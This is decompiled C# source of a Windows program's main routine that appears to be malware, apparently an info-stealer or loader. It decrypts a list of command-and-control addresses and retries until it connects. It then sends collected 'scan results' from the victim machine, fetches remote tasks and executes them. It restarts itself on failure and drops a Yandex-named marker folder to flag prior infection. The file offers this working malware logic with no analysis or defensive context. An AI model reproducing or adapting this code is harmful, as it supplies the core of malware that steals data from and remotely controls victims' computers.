using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;

// Token: 0x0200000D RID: 13
public static class Program
{
	// Token: 0x06000043 RID: 67 RVA: 0x00004107 File Offset: 0x00002307
	private static void Main(string[] args)
	{
		new EntryPoint().Execute();
	}

	// Token: 0x06000044 RID: 68 RVA: 0x00004114 File Offset: 0x00002314
	public static void Execute(this EntryPoint entry)
	{
		try
		{
			if (!string.IsNullOrWhiteSpace(entry.Message))
			{
				new Thread(delegate()
				{
					MessageBox.Show(StringDecrypt.Decrypt(entry.Message, entry.Key), "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				})
				{
					IsBackground = true
				}.Start();
			}
			using (EndpointConnection endpointConnection = new EndpointConnection())
			{
				bool flag = false;
				while (!flag)
				{
					foreach (string address in StringDecrypt.Decrypt(entry.IP, entry.Key).Split(new string[]
					{
						"|"
					}, StringSplitOptions.RemoveEmptyEntries))
					{
						if (endpointConnection.RequestConnection(address) && endpointConnection.TryGetConnection())
						{
							flag = true;
							break;
						}
					}
					Thread.Sleep(5000);
				}
				ScanningArgs settings = new ScanningArgs();
				while (!endpointConnection.TryGetArgs(out settings))
				{
					if (!endpointConnection.TryGetConnection())
					{
						throw new Exception();
					}
					Thread.Sleep(1000);
				}
				ScanResult scanResult = new ScanResult
				{
					ReleaseID = StringDecrypt.Decrypt(entry.ID, entry.Key)
				};
				while (!ResultFactory.sl9HSDF234(settings, ref scanResult))
				{
					Thread.Sleep(5000);
				}
				scanResult.SeenBefore = Program.SeenBefore();
				scanResult.ReplaceEmptyValues();
				while (!endpointConnection.TryVerify(scanResult))
				{
					if (!endpointConnection.TryGetConnection())
					{
						throw new Exception();
					}
					Thread.Sleep(1000);
				}
				ScanResult scanResult2 = scanResult;
				scanResult2.ScanDetails = new ScanDetails();
				IList<UpdateTask> tasks = new List<UpdateTask>();
				while (!endpointConnection.TryGetTasks(scanResult, out tasks))
				{
					if (!endpointConnection.TryGetConnection())
					{
						throw new Exception();
					}
					Thread.Sleep(1000);
				}
				foreach (int taskId in new TaskResolver(scanResult).ReleaseUpdates(tasks))
				{
					while (!endpointConnection.TryCompleteTask(scanResult, taskId))
					{
						if (!endpointConnection.TryGetConnection())
						{
							throw new Exception();
						}
						Thread.Sleep(1000);
					}
				}
			}
		}
		catch (Exception)
		{
			entry.Execute();
		}
	}

	// Token: 0x06000045 RID: 69 RVA: 0x00004380 File Offset: 0x00002580
	public static bool SeenBefore()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YaAddon");
			if (Directory.Exists(path))
			{
				return true;
			}
			Directory.CreateDirectory(path);
			return false;
		}
		catch
		{
		}
		return false;
	}
}
